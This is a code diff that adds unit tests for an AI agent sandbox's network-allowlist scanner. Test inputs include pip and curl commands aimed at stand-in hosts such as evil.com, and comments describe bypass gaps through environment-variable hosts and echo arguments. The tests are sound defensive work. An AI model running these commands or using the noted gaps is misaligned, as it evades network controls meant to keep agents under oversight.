@@ -764,3 +764,46 @@ class TestRestrictedAllowlist:
                 {"agent": {"name": "t"}, "llm": {"model": "m"}, "sandbox": {"network": "alowlist"}},
                 validate=True,
             )
+
+    def test_multiple_hosts_all_checked(self):
+        # Both --index-url hosts are extracted; one allowlisted, one not ->
+        # blocked. A first-match-wins scanner (only checking the first host)
+        # would miss this exfil hijack.
+        sb = self._sb(["pypi.org"])
+        assert (
+            sb.network_allowed("pip install --index-url https://pypi.org/x --extra-index-url https://evil.com/y")
+            is False
+        )
+
+    def test_empty_allowlist_blocks_every_host(self):
+        # No allowlist -> every host is a violation (fail-closed, not "allow all").
+        sb = self._sb([])
+        assert sb.network_allowed("curl https://anyhost/x") is False
+
+    def test_env_var_host_not_scanned(self):
+        # ``$EVIL`` is not a ``scheme://`` authority and the scanner does not
+        # expand env vars -- documented soft gap (intent-limiting tier). pip is
+        # a scanned binary but writes no literal host token -> passes.
+        sb = self._sb(["pypi.org"])
+        assert sb.network_allowed("pip install --index-url $EVIL/x") is True
+
+    def test_ipv4_host_matches(self):
+        # IPv4 host extracted cleanly (no ``@`` / ``:port`` to strip) and
+        # matches an allowlist entry verbatim.
+        sb = self._sb(["10.0.0.1"])
+        assert sb.network_allowed("curl https://10.0.0.1/x") is True
+
+    def test_compound_command_all_hosts_checked(self):
+        # ``sh`` joiners (``&&``) are not separators -- shlex emits them as
+        # tokens. Every URL/SSH host across BOTH sides of the && must match the
+        # allowlist; here ``evil`` is not allowlisted -> blocked.
+        sb = self._sb(["github.com"])
+        assert sb.network_allowed("git clone https://github.com/x && curl https://evil/y") is False
+
+    def test_ssh_embedded_in_echo_not_gated(self):
+        # ``echo`` is NOT a scanned binary (not in the deny set nor in the
+        # allowlist extra set), so the SSH-form host ``git@evil.com:repo``
+        # inside an echo argument is never extracted. Documented gap -- the
+        # soft tier gates egress tools, not arbitrary echo payloads.
+        sb = self._sb(["github.com"])
+        assert sb.network_allowed("echo git@evil.com:repo") is True
